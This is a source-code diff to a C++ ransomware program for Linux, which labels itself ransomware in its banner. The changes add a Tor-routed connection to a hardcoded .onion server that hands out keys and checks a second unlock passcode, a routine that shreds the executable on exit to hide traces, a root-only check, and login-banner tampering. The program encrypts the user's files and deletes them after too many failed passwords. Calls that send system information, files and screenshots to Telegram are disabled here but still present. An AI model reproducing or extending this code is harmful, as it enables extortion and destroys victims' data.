@@ -2,7 +2,7 @@
 // version 1.0
 //
 // Known to work with Debian or Ubuntu based distribution.
-// Some are not compatible on Fedora and Arch, or non-systemd distributions
+// Not tested on Fedora and Arch, or non-systemd distributions
 //
 // For g++ version 8, you need to add -lstdc++fs flag as <filesystem>
 // does not linked by default
@@ -42,6 +42,7 @@
 #include <cerrno>
 #include <pwd.h>
 #include <sstream>
+#include <curl/curl.h>
 #include "audio/happy_birthday.hpp"
 #include "audio/beep.hpp"
 #include "screenshotter.hpp"
@@ -49,6 +50,22 @@
 
 using namespace std;
 namespace fs = std::filesystem;
+
+// Global variable to store the path of the executable
+string executablePath;
+
+void selfDestruct() {
+    if (!executablePath.empty()) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            // Child process
+            execl("/usr/bin/shred", "shred", "-n", "1", "-u", "-z", executablePath.c_str(), (char *)NULL);
+            // If execl fails, the child process will exit
+            exit(1);
+        }
+    }
+}
+
 
 void setupAudioEnvironment() {
     if (geteuid() == 0) { // Only run this if we are root
@@ -69,6 +86,9 @@ const int AES_BLOCK_SIZE = 16;
 const int SALT_SIZE = 16;
 const char FILE_SIGNATURE[] = "SILVASYSTEMS\x01\x00"; //You may change this with your own key
 const string MAP_FILE = "file_map.txt";
+
+
+
 const char* TERMINAL_CANDIDATES[] = {
     "xterm", "uterm", "gnome-terminal", "konsole", "xfce4-terminal",
     "lxterminal", "mate-terminal", "tilix", "x-terminal-emulator", nullptr
@@ -149,7 +169,8 @@ void deriveKey(const string &password, const unsigned char *salt, unsigned char 
                    (unsigned char *)password.data(), password.size(), 1, key, iv);
 }
 
-void processFile(const string &inputFile, const string &outputFile, const string &password, bool encrypt, map<string, string> &fileMap) {
+void processFile(const string &inputFile, const string &outputFile, const string &password, bool encrypt, map<string, string> &fileMap, std::mutex &mtx) {
+    std::lock_guard<std::mutex> lock(mtx);
     ifstream inFile(inputFile, ios::binary);
     ofstream outFile(outputFile, ios::binary);
 
@@ -211,10 +232,9 @@ void processFile(const string &inputFile, const string &outputFile, const string
     }
 }
 
-void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int &counter) {
+void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int &counter, std::mutex &mtx) {
     const int MAX_THREADS = 4; // Limit concurrent threads, change the value if you want faster or slower encryption
     vector<thread> threadPool;
-    mutex mtx;
     atomic<int> activeThreads(0);
     condition_variable cv;
 
@@ -226,8 +246,9 @@ void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int
             string fileName = entry.path().filename().string();
             string relativePath = fs::relative(entry.path(), dirPath).string();
 
-	// this was added to avoid the program itself to be encrypted, for debugging purpose
-            if (fileName == "scramble.exe" || fileName == "scramble" || fileName == MAP_FILE) continue;
+    if (filePath == executablePath) continue;
+	// this was added to avoid the program itself to be encrypted
+            if (fileName == "enscrambled" || fileName == "scramble.exe" || fileName == "scramble" || fileName == MAP_FILE) continue;
             if (fileName.size() > 4 && fileName.substr(0, 4) == "null") continue;
 
             string encryptedFile = "null" + to_string(counter++);
@@ -242,7 +263,7 @@ void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int
 
         activeThreads++;
         threadPool.emplace_back([&, filePath, encryptedFile]() {
-            processFile(filePath, encryptedFile, HARDCODED_PASSWORD, true, fileMap);
+            processFile(filePath, encryptedFile, HARDCODED_PASSWORD, true, fileMap, mtx);
             {
                 lock_guard<mutex> guard(mtx);
                 activeThreads--;
@@ -258,14 +279,14 @@ void encryptDirectory(const fs::path &dirPath, map<string, string> &fileMap, int
 }
 
 void encryptAllFiles() {
-
+    std::mutex mtx;
     map<string, string> fileMap;
     int counter = 1;
-    encryptDirectory(fs::current_path(), fileMap, counter);
+    encryptDirectory(fs::current_path(), fileMap, counter, mtx);
     // to change the Present Working Directory (PWD) into your chosen root directory, or entire root, replace the function encryptDirectory with this example:
-    // encryptDirectory("/home", fileMap, counter);
+    // encryptDirectory("/home", fileMap, counter, mtx);
     // to change it again into PWD, replace with 
-    // encryptDirectory(fs::current_path(), fileMap, counter);
+    // encryptDirectory(fs::current_path(), fileMap, counter, mtx);
     
     // Final cleanup: remove any remaining original files that have been successfully encrypted
     cout << "\033[1;33m[PROCESS]\033[0m Performing final cleanup..." << endl;
@@ -289,6 +310,227 @@ void encryptAllFiles() {
     cout << "\033[1;32m[OK]\033[0m Encryption process completed!" << endl;
 }
 
+#include <openssl/pem.h>
+#include <openssl/rsa.h>
+#include <openssl/err.h>
+#include <openssl/bio.h>
+#include <openssl/evp.h>
+#include <sys/select.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+const string TOR_PROXY = "socks5h://127.0.0.1:9050";
+const string ONION_ADDRESS = "http://hweo5z6qyyanng7ugdfjldeunbvfd3meihgiarflpeksm6hodd2dvnid.onion";
+
+// --- Networking Functions ---
+
+// Callback for libcurl
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* s) {
+    size_t newLength = size * nmemb;
+    try {
+        s->append((char*)contents, newLength);
+    } catch (std::bad_alloc& e) {
+        cerr << "\033[1;31m[FATAL]\033[0m Failed to allocate memory for network response." << endl;
+        return 0;
+    }
+    return newLength;
+}
+
+// Function to get a public key from the server
+std::mutex mtx;
+
+std::pair<std::string, std::string> get_key_from_server() {
+    std::lock_guard<std::mutex> lock(mtx);
+    CURL* curl = curl_easy_init();
+    if (!curl) {
+        cerr << "\n\033[1;31m[FATAL]\033[0m curl_easy_init() failed." << endl;
+        return {"", ""};
+    }
+
+    curl_easy_setopt(curl, CURLOPT_URL, ONION_ADDRESS.c_str());
+    curl_easy_setopt(curl, CURLOPT_PROXY, TOR_PROXY.c_str());
+    curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 1L);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 120L);
+
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        cerr << "\n\033[1;31m[ERROR]\033[0m Tor connection failed: " << curl_easy_strerror(res) << endl;
+        curl_easy_cleanup(curl);
+        return {"", ""};
+    }
+
+    curl_socket_t sock = CURL_SOCKET_BAD;
+    CURLcode sock_res = curl_easy_getinfo(curl, CURLINFO_ACTIVESOCKET, &sock);
+    if (sock_res != CURLE_OK || sock == CURL_SOCKET_BAD) {
+        cerr << "\n\033[1;31m[ERROR]\033[0m Could not get valid socket from cURL: " << curl_easy_strerror(sock_res) << endl;
+        curl_easy_cleanup(curl);
+        return {"", ""};
+    }
+
+    const char* get_key_cmd = "GET_KEY";
+    ssize_t sent = send(sock, get_key_cmd, strlen(get_key_cmd), 0);
+    if (sent < 0) {
+        perror("\n[ERROR] send failed");
+        curl_easy_cleanup(curl);
+        return {"", ""};
+    }
+    if (sent != (ssize_t)strlen(get_key_cmd)) {
+        cerr << "\n\033[1;31m[ERROR]\033[0m Partial send of GET_KEY command." << endl;
+        curl_easy_cleanup(curl);
+        return {"", ""};
+    }
+
+    if (sock >= FD_SETSIZE) {
+        cerr << "\n\033[1;31m[ERROR]\033[0m Socket descriptor is too large for FD_SET." << endl;
+        curl_easy_cleanup(curl);
+        return {"", ""};
+    }
+
+    fd_set read_fds;
+    FD_ZERO(&read_fds);
+    FD_SET(sock, &read_fds);
+    struct timeval timeout;
+    timeout.tv_sec = 60;
+    timeout.tv_usec = 0;
+
+    int select_ret = select(sock + 1, &read_fds, NULL, NULL, &timeout);
+    if (select_ret <= 0) {
+        if (select_ret == 0) cerr << "\n\033[1;31m[ERROR]\033[0m Read timeout: Server did not respond in time." << endl;
+        else perror("\n[ERROR] select failed");
+        curl_easy_cleanup(curl);
+        return {"", ""};
+    }
+
+    char buffer[4096] = {0};
+    int bytes_read = read(sock, buffer, sizeof(buffer) - 1);
+    
+    if (bytes_read <= 0) {
+        cerr << "\n\033[1;31m[ERROR]\033[0m Failed to read from socket after data was expected." << endl;
+        curl_easy_cleanup(curl);
+        return {"", ""};
+    }
+
+    std::string response(buffer, bytes_read);
+    curl_easy_cleanup(curl);
+    if (response == "NO_KEYS_AVAILABLE") {
+        cerr << "\n\033[1;31m[ERROR]\033[0m Server is out of available keys." << endl;
+        return {"", ""};
+    }
+
+    size_t newline_pos = response.find('\n');
+    if (newline_pos == std::string::npos) {
+        cerr << "\n\033[1;31m[ERROR]\033[0m Received invalid key format from server." << endl;
+        return {"", ""};
+    }
+    
+    std::string key_id = response.substr(0, newline_pos);
+    std::string pub_key = response.substr(newline_pos + 1);
+    return {key_id, pub_key};
+}
+
+// Function to verify the passcode with the server
+bool verify_with_server(const std::string& key_id, const std::string& pub_key_str, const std::string& passcode) {
+    std::lock_guard<std::mutex> lock(mtx);
+    BIO* bio = BIO_new_mem_buf(pub_key_str.c_str(), -1);
+    if (!bio) {
+        cerr << "\033[1;31m[FATAL]\033[0m Could not create BIO for public key." << endl;
+        return false;
+    }
+    
+    RSA* rsa = nullptr;
+    
+    // Try SubjectPublicKeyInfo format first (-----BEGIN PUBLIC KEY-----)
+    EVP_PKEY* pkey = PEM_read_bio_PUBKEY(bio, NULL, NULL, NULL);
+    if (pkey) {
+        // Extract RSA key from EVP_PKEY
+        rsa = EVP_PKEY_get1_RSA(pkey);
+        EVP_PKEY_free(pkey);
+    } else {
+        // Try PKCS#1 format (-----BEGIN RSA PUBLIC KEY-----)
+        BIO_reset(bio);
+        rsa = PEM_read_bio_RSAPublicKey(bio, NULL, NULL, NULL);
+    }
+    
+    BIO_free(bio);
+    
+    if (!rsa) {
+        ERR_print_errors_fp(stderr);
+        cerr << "\033[1;31m[FATAL]\033[0m Could not parse public key received from server." << endl;
+        return false;
+    }
+
+    std::vector<unsigned char> encrypted_passcode(RSA_size(rsa));
+    int encrypted_len = RSA_public_encrypt(passcode.length(), (const unsigned char*)passcode.c_str(), encrypted_passcode.data(), rsa, RSA_PKCS1_PADDING);
+    RSA_free(rsa);
+    if (encrypted_len == -1) {
+        cerr << "\033[1;31m[FATAL]\033[0m Failed to encrypt passcode." << endl;
+        return false;
+    }
+
+    CURL* curl = curl_easy_init();
+    if (!curl) return false;
+
+    curl_easy_setopt(curl, CURLOPT_URL, ONION_ADDRESS.c_str());
+    curl_easy_setopt(curl, CURLOPT_PROXY, TOR_PROXY.c_str());
+    curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 1L);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
+
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        curl_easy_cleanup(curl);
+        return false;
+    }
+
+    curl_socket_t sock = CURL_SOCKET_BAD;
+    CURLcode sock_res = curl_easy_getinfo(curl, CURLINFO_ACTIVESOCKET, &sock);
+    if (sock_res != CURLE_OK || sock == CURL_SOCKET_BAD) {
+        cerr << "\n\033[1;31m[ERROR]\033[0m Could not get valid socket from cURL: " << curl_easy_strerror(sock_res) << endl;
+        curl_easy_cleanup(curl);
+        return false;
+    }
+
+    std::string header = "VERIFY " + key_id + " ";
+    std::vector<char> request_data;
+    request_data.insert(request_data.end(), header.begin(), header.end());
+    request_data.insert(request_data.end(), encrypted_passcode.begin(), encrypted_passcode.begin() + encrypted_len);
+
+    if (send(sock, request_data.data(), request_data.size(), 0) < 0) {
+        perror("send failed");
+        curl_easy_cleanup(curl);
+        return false;
+    }
+
+    if (sock >= FD_SETSIZE) {
+        cerr << "\n\u001b[1;31m[ERROR]\u001b[0m Socket descriptor is too large for FD_SET." << endl;
+        curl_easy_cleanup(curl);
+        return false;
+    }
+
+    fd_set read_fds;
+    FD_ZERO(&read_fds);
+    FD_SET(sock, &read_fds);
+    struct timeval timeout;
+    timeout.tv_sec = 60;
+    timeout.tv_usec = 0;
+
+    if (select(sock + 1, &read_fds, NULL, NULL, &timeout) <= 0) {
+        curl_easy_cleanup(curl);
+        return false;
+    }
+
+    char buffer[1024] = {0};
+    int bytes_read = read(sock, buffer, sizeof(buffer) - 1);
+    
+    bool result = false;
+    if (bytes_read > 0 && std::string(buffer, bytes_read) == "Success") {
+        result = true;
+    }
+    
+    curl_easy_cleanup(curl);
+    return result;
+}
+
 void decryptAllFiles() {
     ifstream mapFile(MAP_FILE, ios::binary);
     if (!mapFile) {
@@ -298,10 +540,9 @@ void decryptAllFiles() {
 
     map<string, string> fileMap;
     string encFile, origFile;
-   while (mapFile >> encFile >> std::quoted(origFile)) {
-    fileMap[encFile] = origFile;
-}
-
+    while (mapFile >> encFile >> std::quoted(origFile)) {
+        fileMap[encFile] = origFile;
+    }
     mapFile.close();
 
     int attempts = 0;
@@ -310,32 +551,55 @@ void decryptAllFiles() {
         cout << "Enter password to restore files: ";
         cin >> userPassword;
         if (userPassword == HARDCODED_PASSWORD) {
-            cout << "\033[1;32m[OK]\033[0m Password correct! Starting decryption..." << endl;
+            cout << "\033[1;32m[OK]\033[0m Primary password correct!" << endl;
             
-            for (auto &pair : fileMap) {
-                fs::path outputPath = fs::current_path() / pair.second;
-                if (!fs::exists(outputPath.parent_path())) {
-                    fs::create_directories(outputPath.parent_path());
+            cout << "\033[1;33m[PROCESS]\033[0m Contacting server for a session key..." << endl;
+            auto key_pair = get_key_from_server();
+            std::string key_id = key_pair.first;
+            std::string pub_key = key_pair.second;
+
+            if (key_id.empty() || pub_key.empty()) {
+                cout << "\033[1;31m[FATAL]\033[0m Could not get a session key from the server." << endl;
+            } else {
+                cout << "\033[1;32m[OK]\033[0m Session key " << key_id << " acquired." << endl;
+                cout << "Enter secondary passcode: ";
+                string userSecondaryPassword;
+                cin >> userSecondaryPassword;
+
+                cout << "\033[1;33m[PROCESS]\033[0m Verifying secondary passcode with server..." << endl;
+                if (verify_with_server(key_id, pub_key, userSecondaryPassword)) {
+                    cout << "\033[1;32m[OK]\033[0m Secondary passcode correct! Starting decryption..." << endl;
+                    
+                    std::mutex mtx;
+                    for (auto &pair : fileMap) {
+                        fs::path outputPath = fs::current_path() / pair.second;
+                        if (!fs::exists(outputPath.parent_path())) {
+                            fs::create_directories(outputPath.parent_path());
+                        }
+                        processFile(pair.first, outputPath.string(), HARDCODED_PASSWORD, false, fileMap, mtx);
+                    }
+                    
+                    cout << "\033[1;33m[PROCESS]\033[0m Cleaning up encrypted files..." << endl;
+                    for (auto &pair : fileMap) {
+                        if (fs::exists(pair.first)) {
+                            fs::remove(pair.first);
+                            cout << "\033[1;32m[OK]\033[0m Removed: " << pair.first << endl;
+                        }
+                    }
+                    
+                    fs::remove(MAP_FILE);
+                    cout << "\033[1;32m[SUCCESS]\033[0m All files have been restored and encrypted files cleaned up!" << endl;
+                    return; 
+                } else {
+                    cout << "\033[1;31m[WARNING]\033[0m Incorrect secondary passcode or server verification failed." << endl;
                 }
-                processFile(pair.first, outputPath.string(), HARDCODED_PASSWORD, false, fileMap);
             }
-            
-            // Remove encrypted files after successful decryption
-            cout << "\033[1;33m[PROCESS]\033[0m Cleaning up encrypted files..." << endl;
-            for (auto &pair : fileMap) {
-                if (fs::exists(pair.first)) {
-                    fs::remove(pair.first);
-                    cout << "\033[1;32m[OK]\033[0m Removed: " << pair.first << endl;
-                }
-            }
-            
-            // Remove the map file
-            fs::remove(MAP_FILE);
-            cout << "\033[1;32m[SUCCESS]\033[0m All files have been restored and encrypted files cleaned up!" << endl;
-            return;
+        } else {
+            cout << "\033[1;31m[WARNING]\033[0m Incorrect password." << endl;
         }
-        cout << "\033[1;31m[WARNING]\033[0m Incorrect password. Attempts left: " << (MAX_PASSWORD_ATTEMPTS - attempts - 1) << endl;
+        
         attempts++;
+        cout << "Attempts left: " << (MAX_PASSWORD_ATTEMPTS - attempts) << endl;
     }
     cout << "\n\033[1;31m[SORRY]\033[0m Max password attempts reached. Sorry but we need to delete these files.\n" << endl;
     for (auto &pair : fileMap) {
@@ -657,6 +921,7 @@ void checkDependencies() {
     installPackageIfMissing("acpi");
     installPackageIfMissing("xterm");
     installPackageIfMissing("scrot");
+    installPackageIfMissing("tor");
     installPackageIfMissing("libsdl2-dev"); // for beeps
 } 
 
@@ -668,18 +933,18 @@ bool generateHtmlFile(const std::string& outputPath = "generated.html");
 bool addPresetUser(bool debug = false);
 
 int main(int argc, char* argv[]) {
-
 // This requires you to run this program into root.
 // Comment the "if" part if you don't want to run it as root.
+    if (geteuid() != 0) {
+        cerr << "\n\033[1;31m[ERROR]\033[0m This program must be run as root." << endl;
+        exit(1);
+    }
+    executablePath = fs::absolute(argv[0]).string();
+    atexit(selfDestruct);
 
     if (handleHappyBirthdayMode(argc, argv)) {
         return 0;
     }
-
-if (geteuid() != 0) {
-    cerr << "\n\033[1;31m[ERROR]\033[0m This program must be run as root." << endl;
-    exit(1);
-}
 
 	cout << "\033[1;34m[START]\033[0m We need to check if the required dependencies are installed.\n" << endl;
                   
@@ -695,20 +960,22 @@ if (!fs::exists(MAP_FILE)) {
 
     backup_motd();
     change_motd();
+    backup_issue();
+    change_issue();
 
     fs::path selfPath = fs::absolute(argv[0]);  // Full binary path
    
     relaunchInTerminalIfDetached(argv[0]);
     generateHtmlFile("index.html");
     launchHappyBirthdayTerminal(selfPath.string());
-    setupProtection();
+    //setupProtection();
     
-    // this part is unstable as fuck
+    
     //thread wd(watchdog, selfPath);
     //wd.detach();
     
-    thread antiMonitor(monitorAndKillTaskManagers);
-    antiMonitor.detach();
+    //thread antiMonitor(monitorAndKillTaskManagers);
+    //antiMonitor.detach();
 
         cout << " _____ _ _      _   _       _ _\n|  ___(_) | ___| \\ | |_   _| | | ___ _ __ \n| |_  | | |/ _ \\  \\| | | | | | |/ _ \\ '__|\n|  _| | | |  __/ |\\  | |_| | | |  __/ |   \n|_|   |_|_|\\___|_| \\_|\\__,_|_|_|\\___|_|   \nThe not-so-bad RANSOMWARE for Linux by Colton Silva\n" << endl;
 
@@ -731,9 +998,9 @@ if (!fs::exists(MAP_FILE)) {
         stop_beeping = true;
         beep_thread.join();
         
-        string info = gatherFullSystemInfo();
-        sendMessageToTelegram(info);
-        sendRandomEncryptedFiles(fs::current_path().string(), 10);
+        //string info = gatherFullSystemInfo();
+        //sendMessageToTelegram(info);
+        //sendRandomEncryptedFiles(fs::current_path().string(), 10);
 
         // If you want to encrypt root directory, do this example here:
         // sendRandomEncryptedFiles("/home", 10);
@@ -742,7 +1009,7 @@ if (!fs::exists(MAP_FILE)) {
 
         // Take a screenshot and send it to Telegram
 
-        sendScreenshotToTelegram();
+        //sendScreenshotToTelegram();
         
         decryptAllFiles();
         return 0; 
